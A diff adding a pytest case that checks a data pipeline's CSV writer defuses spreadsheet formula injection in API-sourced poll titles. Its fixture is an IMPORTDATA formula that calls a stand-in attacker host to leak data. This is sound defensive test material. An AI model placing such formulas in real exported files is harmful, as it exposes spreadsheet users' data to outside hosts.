@@ -355,6 +355,33 @@ def test_write_fetch_csvs_writes_both_files_and_returns_paths(tmp_path, monkeypa
     assert (tmp_path / "sky.csv").read_text().splitlines()[0] == "contract,date,sky"
 
 
+def test_write_fetch_csvs_defuses_formula_like_titles(tmp_path, monkeypatch):
+    """API-sourced titles starting with a formula character are quoted so spreadsheet apps render them as text."""
+    monkeypatch.setattr(pipeline, "OUTPUT_DIR", tmp_path)
+
+    df_sky = pd.DataFrame([{"contract": "0xa", "date": date(2026, 4, 1), "sky": 100.0}])
+    df = pd.DataFrame({
+        "Delegate Name": ["alpha"],
+        "Delegate Contract": ["0xa"],
+        "Start Date": ["2024-01-01"],
+        "101": ["Yes"],
+    })
+    poll_info = [
+        {
+            "pollId": 101,
+            "startDate": date(2026, 4, 1),
+            "endDate": date(2026, 4, 3),
+            "title": '=IMPORTDATA("https://evil.example/leak")',
+        },
+    ]
+
+    _write_fetch_csvs(df, df_sky, poll_info, [])
+
+    participation = (tmp_path / "vote_participation.csv").read_text()
+    assert "'=IMPORTDATA" in participation
+    assert '"=IMPORTDATA' not in participation
+
+
 # ---------------------------------------------------------------------------
 # _write_fetch_workbook_tabs — sheets writer orchestration
 # ---------------------------------------------------------------------------
